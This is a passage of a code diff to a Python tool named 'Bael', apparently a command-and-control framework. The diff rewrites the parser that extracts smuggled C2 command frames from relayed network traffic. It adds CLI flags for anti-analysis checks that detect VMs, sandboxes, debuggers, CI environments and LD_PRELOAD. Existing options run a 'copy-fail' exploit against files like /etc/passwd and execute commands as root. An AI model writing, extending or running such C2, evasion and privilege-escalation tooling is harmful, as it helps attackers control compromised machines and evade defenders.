     async def _clientToServer(self, r):
-        buffer = bytearray()
+        buf = BaelBuffer()
         while True:
             data = await r.read(32768)
             if not data: break
             
-            buffer.extend(data)
+            buf.feed(data)
             
             # Process buffered data for smuggled frames
-            while SMUGGLE_MAGIC in buffer:
-                magic_idx = buffer.find(SMUGGLE_MAGIC)
-                
-                # If there is data before the magic, it's regular relay traffic (ignored in server mode here)
-                if magic_idx > 0:
-                    buffer = buffer[magic_idx:]
-                
-                # Check if we have enough for the length header
-                if len(buffer) < len(SMUGGLE_MAGIC) + 2:
+            while True:
+                magic_idx = buf.find(SMUGGLE_MAGIC)
+                if magic_idx == -1:
+                    # Discard everything but the potential end of a split magic
+                    keep = len(SMUGGLE_MAGIC) - 1
+                    if len(buf) > keep:
+                        buf.consume(len(buf) - keep)
                     break
                 
-                payload_len = int.from_bytes(buffer[len(SMUGGLE_MAGIC):len(SMUGGLE_MAGIC)+2], "big")
+                if magic_idx > 0:
+                    buf.consume(magic_idx)
+                
+                if len(buf) < len(SMUGGLE_MAGIC) + 2: break
+                
+                header = buf.peek(len(SMUGGLE_MAGIC) + 2)
+                payload_len = int.from_bytes(header[len(SMUGGLE_MAGIC):], "big")
                 frame_end = len(SMUGGLE_MAGIC) + 2 + payload_len
                 
-                if len(buffer) < frame_end:
-                    break # Wait for more data
+                if len(buf) < frame_end: break
                 
-                frame = bytes(buffer[:frame_end])
+                frame = buf.consume(frame_end)
                 await self.c2.pCommand(frame)
-                buffer = buffer[frame_end:]
-            
-            # Clean up buffer if it grows too large with non-C2 data
-            if len(buffer) > 65536 and SMUGGLE_MAGIC not in buffer:
-                buffer.clear()
 
     async def connex(self,rhost:str,rport:int):
         logger.debug(f"(connex) Testing connection to {str(rhost)}:{str(rport)}")
@@ -1244,7 +1650,6 @@ class Bael:
                 self.mTask = asyncio.create_task(self.spawnServer(self.config["lhost"][0], self.config["lhost"][1]))
             else: 
                 self.mTask = asyncio.create_task(self.spawnClient(self.config["rhost"][0], self.config["rhost"][1]))
-
             shutdown_wait_task = asyncio.create_task(self._shutdown_event.wait())
             # Wait for either the main task to complete or a shutdown signal
             done, pending = await asyncio.wait(
@@ -1341,6 +1746,19 @@ def main():
     p.add_argument("--c2-cftarget", type=str, help="Target file for copy-fail exploit (e.g. /etc/passwd)")
     p.add_argument("--c2-cfexec", type=str, help="Command to execute with root privileges after successful exploit")
     p.add_argument("--c2-cfrun",action="store_true",help="Runs full copy-fail exploit [PTY].")
+    # antiAliasing
+    p.add_argument("--c2-aa-mac", action="store_true", help="Detect VM via MAC address prefixes.")
+    p.add_argument("--c2-aa-uuid", action="store_true", help="Detect VM via Hardware UUID patterns.")
+    p.add_argument("--c2-aa-cores", action="store_true", help="Detect VM via low CPU core count.")
+    p.add_argument("--c2-aa-drivers", action="store_true", help="Detect VM via kernel modules/drivers.")
+    p.add_argument("--c2-aa-dbgr", action="store_true", help="Detect if a debugger is attached.")
+    p.add_argument("--c2-aa-vm", action="store_true", help="Detect VM environment (Composite check).")
+    p.add_argument("--c2-aa-sandbox", action="store_true", help="Detect sandbox/container environment.")
+    p.add_argument("--c2-aa-ci", action="store_true", help="Detect if running in a CI/CD environment.")
+    p.add_argument("--c2-aa-ld", action="store_true", help="Detect LD_PRELOAD usage.")
+    p.add_argument("--c2-aa-timing", action="store_true", help="Detect timing anomalies (Aggressive).")
+    p.add_argument("--c2-aa-ptrace", action="store_true", help="Get current ptrace_scope value.")
+    p.add_argument("--c2-aa-all", action="store_true", help="Execute all anti-aliasing checks.")
     
     args = p.parse_args()
     logger.setLevel(args.log_lvl.upper())
@@ -1382,6 +1800,27 @@ def main():
         dummy_c2 = C2(None, None, args)
         cf = dummy_c2.copyFail(args)
         cf.run(args.c2_cftarget, execCmd=args.c2_cfexec)
+        sys.exit(0)
+
+    # Handle Anti-Aliasing CLI flags
+    aa_flags = [args.c2_aa_mac, args.c2_aa_uuid, args.c2_aa_cores, args.c2_aa_drivers, 
+                args.c2_aa_dbgr, args.c2_aa_vm, args.c2_aa_sandbox, args.c2_aa_ld, 
+                args.c2_aa_timing, args.c2_aa_ptrace, args.c2_aa_ci, args.c2_aa_all]
+    if any(aa_flags):
+        dummy_c2 = C2(None, None, args)
+        aa = dummy_c2.AntiAlias(logger)
+        if args.c2_aa_mac: logger.info(f"MAC Detection: {aa.detectMacAddr()}")
+        if args.c2_aa_uuid: logger.info(f"UUID Detection: {aa.detectHardwareUUID()}")
+        if args.c2_aa_cores: logger.info(f"CPU Cores Detection: {aa.detectCPUCores()}")
+        if args.c2_aa_drivers: logger.info(f"VM Driver Detection: {aa.detectVMDrivers()}")
+        if args.c2_aa_dbgr: logger.info(f"Debugger Detection: {aa.detectDbgr()}")
+        if args.c2_aa_vm: logger.info(f"VM Detection (Composite): {aa.detectVM()}")
+        if args.c2_aa_sandbox: logger.info(f"Sandbox Detection: {aa.detectSandbox()}")
+        if args.c2_aa_ci: logger.info(f"CI/CD Detection: {aa.detectCI()}")
+        if args.c2_aa_ld: logger.info(f"LD_PRELOAD Detection: {aa.detectLDPreload()}")
+        if args.c2_aa_timing: logger.info(f"Timing Anomaly Detection: {aa.detectTimingAnomaly()}")
+        if args.c2_aa_ptrace: logger.info(f"PTrace Scope: {aa.getPTraceScope()}")
+        if args.c2_aa_all: logger.info(f"Full Anti-Alias Check: {json.dumps(aa.detectALL(), indent=2)}")
         sys.exit(0)
 
     if args.kg_priv: args.key = genpriv(args)
